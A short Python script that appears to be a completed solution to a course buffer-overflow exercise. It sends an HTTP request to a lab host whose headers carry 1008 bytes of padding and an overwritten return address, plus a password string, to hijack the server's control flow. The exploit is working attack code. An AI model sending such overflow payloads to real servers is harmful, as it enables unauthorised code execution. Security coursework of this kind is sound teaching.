import socket
import random
from sqlite3 import DatabaseError

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')

# Method should always be get
METHOD = b"GET/HTTP/1.1"

PORT = 10001#random.randint(10000, 10025)

# We don't care what URL we're grabbing; they all have the possibility of exploit...
URL = b"/"

# Figure out how many bytes we need to pad until we get to the return address 
# on the stack. (Hint: It's not 10...)
N = 1008
PADDING = b"\xff" * N

# Fill this in with the address you actually want instead of `0xdeadbeef`
ADDRESS = to_bytes(0x00000000004030d6 )

# The "exploit string" is what we send in as the headers
HEADERS = PADDING + ADDRESS

# The functions we call will often look in the request's data for a password.
# So, we send it here.
DATA = b"d83887129a"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request = METHOD + b" " + URL + b"\r\n" + HEADERS + b"\r\n\r\n" + DATA
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
